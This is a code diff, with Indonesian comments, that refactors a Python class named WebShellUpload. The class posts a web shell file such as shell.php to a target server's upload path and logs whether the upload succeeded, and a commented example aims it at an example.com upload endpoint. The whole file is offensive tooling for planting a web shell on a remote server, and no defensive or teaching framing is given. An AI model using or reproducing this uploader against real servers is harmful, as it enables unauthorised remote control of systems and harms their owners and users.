@@ -1,17 +1,27 @@
 import requests
+import logging
+
+logger = logging.getLogger(__name__)
 
 class WebShellUpload:
-    def __init__(self, target_url, shell_path):
+    def __init__(self, target_url):
         self.target_url = target_url
-        self.shell_path = shell_path
 
-    def upload_shell(self):
-        files = {'file': open(self.shell_path, 'rb')}
-        try:
-            response = requests.post(self.target_url, files=files)
-            if response.status_code == 200:
-                print("WebShell uploaded successfully!")
-            else:
-                print(f"Failed to upload WebShell, status code: {response.status_code}")
-        except requests.RequestException as e:
-            print(f"Error during WebShell upload: {e}")
+    def upload_shell(self, file_path, target_path):
+        """
+        Mengupload web shell ke server target.
+        """
+        with open(file_path, 'rb') as file:
+            files = {'file': (file_path, file)}
+            try:
+                response = requests.post(self.target_url + target_path, files=files)
+                if "success" in response.text.lower():
+                    logger.info(f"Shell uploaded successfully to {self.target_url + target_path}")
+                else:
+                    logger.info("Shell upload failed.")
+            except Exception as e:
+                logger.error(f"Error during shell upload: {str(e)}")
+
+# Contoh penggunaan:
+# webshell = WebShellUpload("http://example.com/upload")
+# webshell.upload_shell("/path/to/shell.php", "/uploads/")
